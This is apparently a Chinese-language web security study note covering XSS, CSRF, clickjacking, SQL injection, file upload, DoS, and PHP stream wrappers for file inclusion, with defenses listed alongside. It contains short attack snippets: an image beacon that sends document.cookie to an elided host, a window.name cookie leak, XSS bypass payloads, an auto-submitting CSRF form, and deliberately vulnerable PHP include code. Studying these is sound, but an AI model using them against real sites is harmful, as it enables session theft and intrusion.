# Web安全
***

## 游览器安全
* 同源策略
* 可以跨源的标签:`<script>,<img>,<iframe>,<link>`
* 受同源策略的限制:`DOM,Cookie,XMLHttpReuest,Flash(会通过对方的crossdomain.xml来判断)`
* EV SSL证书

## XSS攻击
* 反射型XSS: 需要用户点击才可发起攻击
    * 服务端
    ~~~php
    <?php
        $a = $_GET['a'];
        echo $a;
    ?>
    ~~~
    * 客户端: http://..../?a=(js)
    * 出现地方: **多出现在搜索的地方**
* 存储型XSS: 会把用户的输入存储到服务端
* DOM Based XSS: 通过标签的封闭来注入
	* 实例
	~~~html
    document.getElementById('t').innerHTML = "<a href='"+str+"' >testLink</a>"
    ...
    <div id='t'></div>
    ~~~
    * 攻击代码
    ~~~javascript
    str = '><script>alert(/xss/);</script><'
    ~~~
* 窃取Cookie
~~~javascript
var img = document.createElement('img');
img.src = 'http://.../log?coo='+escape(document.cookie);
document.body.appendChild(img);
~~~
* 构造POST和GET请求
	* GET: `img.src = http://.../?a=123&b=123`
	* POST:`ajax,jquery`
* 识别用户游览器：`alert(navigator.userAgent)`
* 获取用户IP
* 获取用户的历史
* XSS平台
	* Attaack API
	* BeEF(useful)
	* XSS-Proxy
* XSS构造技巧
	* 利用字符编码: `%c1\`在Unicode下会被当成一个字符，而在utf-8下不会
	* 绕过长度限制
		1. 服务端长度限制:对`$var`有长度限制
		~~~html
        <input type="text" value="$var">
        ~~~
        2. 普通技巧: `"><script>alert(/xss/)</script>`
        3. 缩短: `"onclick=alert(1)//`
        4. 或者用`SRC`链接
	* 使用`<base>`标签：定义页面上所使用“相对路径”的hosting地址，作用与后面的所有标签
	~~~html
    <base href="http://127.0.0.1">
    <img src="a.png">
    <!--src="http://127.0.0.1/a.png"-->
    ~~~
	* window.name的妙用
	~~~javascript
    /*实现跨域*/
    window.name = document.cookie;
    location.href = "http://...../...";
    ~~~
    * 重定向的利用：如果A域存在存储型漏洞，B域存在存储型或反射型XSS漏洞，可以从A跳到B，获取URL后跳回A，就达到了跨与攻击的目的。
* XSS防御
	* HttpOnly:游览器禁止JS访问带有HttpOnly属性的Cookie
	~~~php
    setcookie("name","value",,null,null,null,null,true) //最后一个true代表设置为httpOnly
    ~~~
    * 输入检查
    * 输出检查：`> --> &gt`,对php：htmlspecialchars;对javascript:JavascriptEncode(函数需要自己实现)
    * 编码：htmlEncode,javascriptEncode,urlEncode

##  CSRF攻击
* 全称：Cross Site Request Forgery
* Cookie分为两种：Session Cookie(临时Cookie)，Third-party Cookie(本地Cookie)。
* 对于不同的游览器，对于第三方Cookie的处理是不一样的。从A域访问B域，IE会拦截第三方Cookie，Firefox,Chrome则不会。
* P3P头可以实现发送第三方Cookie。
* POST请求构造技巧
~~~html
<iframe>
    <form action="..." id="p" method="post">
        <input type="text" name="username" value="aasd"/>
        <input type="password" name="passwd" vaue=""/>
        <input type="submit" name="submit" value="submit"/>
    <script>
        $("#p").submit();
        </script>
    </form>
</iframe>
~~~

* CSRF的防御
	* 添加验证码：给重要操作加上验证码
	* Referer Check:检查请求是否来自合法的“源”
	* Anti CSRF Token的使用：Cookie和Form中存token，服务器比对结果。

## ClickJacking(点击劫持)
* 通过iframe或其他tag设置为透明覆盖在网页功能键上实现点击劫持。
* Cross Site Image Overlaying(XSIO):他通过控制img的style改变位置，实现劫持。
* 防御
	* X-Frame-Options:http头
		1. DENY: 游览器会拒绝加载任何frame页面
		2. SAMEORIGIN: frame页面的地址只能为同域名下的页面
		3. ALLOW-FROM: 定义允许frame加载的页面地址

## Html5安全
* 新标签的影响：如video允许远程调用视频
* iframe的sandbox
* Link Types:noreferrer
* Canvas标签: 可是用Canvas破解验证码
* Web Storage: 保存数据

## SQL攻击
* 关闭错误回显：如果不关闭，如添加"'"会返回敏感信息。
* 宽字带注入： %5c
* SQL Column Truncation: sql-mode设置,mysql默认为严格模式。
* 防御：使用预编译语句，存储过程，检查数据类型，使用安全的函数
~~~php
//预编译
$query = "insert into city values(name,code,dis) values(?,?,?)";
$stmt = $mysqli->prepare($query);
$stmt->bind_param("sss",$val1,$val2,$val3);
$val1 = 'a';
$val2 = '1';
$val3 = '123';
$stmt->execute();
~~~
* 其他注入：XML注入，代码注入（如system函数），CRLF注入(\r\n,%0d%0a)

## 文件上传漏洞
* 漏洞类型：上传Web脚本语言，上传Flash策略文件crossdomain.xml,上传木马文件，上传包含了脚本的图片。
* 防御最好用白名单形式。（判断文件名后缀和检查文件头）
* 文件截断：`%00(修改POST数据,对路径而言)`
* 服务器解析漏洞

## 认证与会话管理
* 认证的目的是为了认出用户是谁，授权的目的是为了决定用户能够做什么。
* 加密密码：md5(passwd),md5(passwd+salt)
* Session Fixation攻击：登录前后Session未更新
* 单点登录：只需要认证一次就可以使用所有系统（多因素认证）。

## 访问控制
* 用户--->角色-->权限
* 越权访问（如http://.../?id=1,通过修改id访问其他用户）
* 垂直权限与水平权限
* OAuth
## Web框架安全
* MVC框架：在正确的地方做正确的事。

## 拒绝服务攻击
* DDOS分类：SYN flood, UDP flood, ICMP flood.(资源过载)
* DDOS有网络层的和应用层的，网络层是利用TCP设计漏洞，应用层是利用请求耗费资源的请求（如数据库写入）
* Slowloris, HTTP POST DOS, Server Limit DOS,RsDOS(正则表达式引发的DOS,/^(a+)+$/,如果输入aaaaaaaaaaaaaax)

## 本地文件包含的利用技巧
1. 包含用户上传的文件
2. 包含data:// 或 php://input等伪协议
3. 包含日志文件
4. 包含上传的临时文件
5. 包含其他文件

## php伪协议详解
### 支持类型
* file://---访问本地
* http://---访问HTTP(s)网址
* ftp://---访问FTP(s) URLs
* php://---访问各个输入/输出流(I/O streams)
* zlib://---压缩流
* data://---数据
* glob://---查找匹配的文件路径模式
* phar://---PHP归档
* ssh2://---Secure Shell 2
* rar://---RAR
* ogg://---音频流
* expect://---处理交互式的流

### php://
* 包含: php://stdin, php://stdout, php://stderr
* php://stdin
~~~php
<?php
    while($line = fopen('php://stdin','r'))
    {//open our file pointer to read from stdin
        echo $line."\n";
        echo fgets($line);//读取
    }
?>
~~~
![stdin](http://img.blog.csdn.net/20170409140559729?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTmk5aHRNYXIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
* php://stdout
~~~php
<?php
    $fd = fopen('php://stdout', 'w');
    if ($fd) {
        echo $fd."\n";
        fwrite($fd, "这是一个测试");
        fwrite($fd, "\n");
        fclose($fd);
    }
?>
~~~
![img](http://img.blog.csdn.net/20170409141123076?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTmk5aHRNYXIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

* php://input
~~~php
<?php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    //include($file); //class.php
}else{
    echo "you are not admin ! ";
}
?>
~~~
![img](http://img.blog.csdn.net/20170409141221973?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTmk5aHRNYXIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

* php://output
~~~php
<?php
    $out=fopen("php://stdout", 'w');  
    echo $out."\n";
    fwrite($out , "this is a test");
    fclose($out);
?>
~~~
![img](http://img.blog.csdn.net/20170409141401718?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTmk5aHRNYXIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

### php://filter: 与include文件利用
~~~php
<?php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
?>
//语法：var=php://filter/read=filter_type/resource=file
//其他过滤器:string.toupper,string.tolower,string.strip_tags,convert.base64-encode,convert.base64-decode.
~~~
![img](http://img.blog.csdn.net/20170409141615103?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTmk5aHRNYXIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
